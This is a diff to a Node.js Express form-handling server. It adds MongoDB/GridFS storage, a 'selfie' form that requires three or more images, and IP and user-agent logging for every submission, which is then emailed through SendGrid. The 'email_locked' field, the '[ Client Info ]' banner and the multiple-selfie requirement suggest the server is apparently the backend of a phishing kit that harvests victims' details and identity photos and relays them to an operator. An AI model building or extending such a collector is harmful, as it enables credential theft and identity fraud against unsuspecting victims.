@@ -2,6 +2,10 @@ const express = require('express');
 const cors = require('cors');
 const sgMail = require('@sendgrid/mail');
 const rateLimit = require('express-rate-limit');
+const { MongoClient, ServerApiVersion, GridFSBucket } = require('mongodb');
+const multer = require('multer');
+const { GridFsStorage } = require('multer-gridfs-storage');
+const sanitizeHtml = require('sanitize-html');
 const app = express();
 
 // Middleware
@@ -9,24 +13,77 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cors({ origin: process.env.FRONTEND_URL || '*' }));
 
-// Rate limiting to prevent abuse
+// Rate limiting
 app.use('/api/submit', rateLimit({
     windowMs: 15 * 60 * 1000, // 15 minutes
-    max: 100 // Limit each IP to 100 requests per window
+    max: 100
 }));
 
 // Set SendGrid API key
 sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
-// Handle GET /api/submit (not allowed)
+// MongoDB setup
+const uri = process.env.MONGODB_URI;
+const client = new MongoClient(uri, {
+    serverApi: { version: ServerApiVersion.v1, strict: true, deprecationErrors: true }
+});
+let db, gfs;
+
+// Connect to MongoDB
+async function connectToMongo() {
+    try {
+        await client.connect();
+        db = client.db('form_data');
+        gfs = new GridFSBucket(db, { bucketName: 'uploads' });
+        console.log('Connected to MongoDB');
+    } catch (error) {
+        console.error('MongoDB connection error:', error);
+        process.exit(1);
+    }
+}
+connectToMongo();
+
+// Multer setup for file uploads
+const storage = new GridFsStorage({
+    url: process.env.MONGODB_URI,
+    file: (req, file) => ({
+        filename: `${Date.now()}_${file.originalname}`,
+        bucketName: 'uploads'
+    })
+});
+const upload = multer({
+    storage,
+    limits: { fileSize: 5 * 1024 * 1024 }, // 5MB limit
+    fileFilter: (req, file, cb) => {
+        if (file.mimetype.startsWith('image/')) {
+            cb(null, true);
+        } else {
+            cb(new Error('Only image files are allowed'), false);
+        }
+    }
+});
+
+// Sanitize input
+function sanitizeInput(data) {
+    const sanitized = {};
+    for (const [key, value] of Object.entries(data)) {
+        sanitized[key] = typeof value === 'string' ? sanitizeHtml(value, {
+            allowedTags: [], allowedAttributes: {}
+        }) : value;
+    }
+    return sanitized;
+}
+
+// Handle GET /api/submit
 app.get('/api/submit', (req, res) => {
     res.status(405).json({ error: 'Method Not Allowed. Use POST to submit form data.' });
 });
 
-// POST endpoint for all form submissions
-app.post('/api/submit', async (req, res) => {
-    const formData = req.body;
+// POST endpoint for form submissions
+app.post('/api/submit', upload.array('attach[]', 4), async (req, res) => {
+    const formData = sanitizeInput(req.body);
     const formType = formData.form_type || 'Unknown Form';
+    const files = req.files;
 
     // Basic validation
     if (!formData || Object.keys(formData).length === 0) {
@@ -119,8 +176,46 @@ app.post('/api/submit', async (req, res) => {
             if (email_locked && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email_locked)) {
                 return res.status(400).json({ error: 'Invalid email_locked format' });
             }
+        } else if (formType === 'selfie') {
+            if (!files || files.length < 3) {
+                return res.status(400).json({ error: 'At least three image files are required' });
+            }
+            if (email_locked && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email_locked)) {
+                return res.status(400).json({ error: 'Invalid email_locked format' });
+            }
         } else {
             return res.status(400).json({ error: 'Unknown form type' });
+        }
+
+        // Prepare data for MongoDB
+        const submission = {
+            form_type: formType,
+            data: formData,
+            client_info: {
+                ip: req.ip,
+                timestamp: new Date().toUTCString(),
+                user_agent: req.get('User-Agent')
+            },
+            created_at: new Date()
+        };
+
+        // Add file metadata for selfie form
+        if (formType === 'selfie') {
+            submission.files = files.map(file => ({
+                filename: file.filename,
+                contentType: file.mimetype,
+                size: file.size,
+                uploadDate: new Date()
+            }));
+        }
+
+        // Save to MongoDB
+        try {
+            await db.collection('submissions').insertOne(submission);
+            console.log(`Stored ${formType} submission in MongoDB`);
+        } catch (error) {
+            console.error('MongoDB insert error:', error);
+            return res.status(500).json({ error: `Failed to store ${formType} data in database: ${error.message}` });
         }
 
         // Build email content
@@ -131,6 +226,14 @@ app.post('/api/submit', async (req, res) => {
                 textContent += `${key}: ${value}\n`;
                 htmlContent += `<p><strong>${key}:</strong> ${value}</p>`;
             }
+        }
+        if (formType === 'selfie') {
+            textContent += `\nFiles Uploaded:\n`;
+            htmlContent += `<h4>Files Uploaded:</h4>`;
+            files.forEach(file => {
+                textContent += `- ${file.filename} (${(file.size / 1024).toFixed(2)} KB)\n`;
+                htmlContent += `<p>- ${file.filename} (${(file.size / 1024).toFixed(2)} KB)</p>`;
+            });
         }
         textContent += `\n++------[ Client Info ]------++\n`;
         textContent += `IP: ${req.ip}\nTimestamp: ${new Date().toUTCString()}\nUser-Agent: ${req.get('User-Agent')}\n`;
@@ -148,13 +251,25 @@ app.post('/api/submit', async (req, res) => {
         };
 
         // Send email via SendGrid
-        await sgMail.send(msg);
-        console.log(`Email sent for ${formType} submission`);
-        res.json({ status: 'success', message: `${formType} data received and emailed` });
+        try {
+            await sgMail.send(msg);
+            console.log(`Email sent for ${formType} submission`);
+            res.json({ status: 'success', message: `${formType} data received, stored, and emailed` });
+        } catch (error) {
+            console.error('SendGrid Error:', error);
+            res.json({ status: 'partial_success', message: `${formType} data stored in database but failed to send email: ${error.message}` });
+        }
     } catch (error) {
         console.error('Error processing request:', error);
         res.status(500).json({ error: `Failed to process ${formType} data: ${error.message}` });
     }
+});
+
+// Graceful shutdown
+process.on('SIGTERM', async () => {
+    console.log('Shutting down...');
+    await client.close();
+    process.exit(0);
 });
 
 // Start server
